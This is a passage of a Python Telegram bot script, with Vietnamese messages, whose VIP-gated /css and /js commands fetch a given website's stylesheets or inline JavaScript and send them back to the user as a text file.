            css_response = requests.get(css_url)
            if css_response.status_code == 200:
                css_code += css_response.text

        return css_code
    else:
        return ""

# Handler cho lệnh "/css"
@bot.message_handler(commands=['css'])
def css_command(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return

    command_args = message.text.split()
    if len(command_args) < 2:
        bot.reply_to(message, "Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /css <link_website>")
        return

    url = command_args[1]
    css_code = get_css_code(url)

    if css_code:
        save_css_code("css_code.txt", css_code)
        bot.send_document(message.chat.id, document=open('css_code.txt', 'rb'), caption=f"Mã CSS Từ Trang {url}")
    else:
        bot.reply_to(message, "Không Thể Lấy Mã CSS Từ Trang Web")

def save_js_code(file_path, js_code):
    with open(file_path, "w") as file:
        file.write(js_code)

def get_js_code(url):
    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        js_code = ""

        # Trích xuất mã JavaScript từ thẻ <script>
        script_tags = soup.find_all("script")
        for tag in script_tags:
            if tag.string:
                js_code += tag.string

        return js_code
    else:
        return ""

# Handler cho lệnh "/js"
@bot.message_handler(commands=['js'])
def js_command(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='Mua Vip Đi Bạn. Nhắn /admin Để Liên Hệ Admin Nhé.')
        return

    command_args = message.text.split()
    if len(command_args) < 2:
        bot.reply_to(message, "Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /js <link_website>")
        return

    url = command_args[1]
    js_code = get_js_code(url)

    if js_code:
        save_js_code("js_code.txt", js_code)
        bot.send_document(message.chat.id, document=open('js_code.txt', 'rb'), caption=f"Mã JavaScript Từ Trang {url}")
    else:
        bot.reply_to(message, "Không Thể Lấy Mã JavaScript Từ Trang Web")

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh Không Hợp Lệ. Vui Lòng Sử Dụng Lệnh /help Để Xem Danh Sách Lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
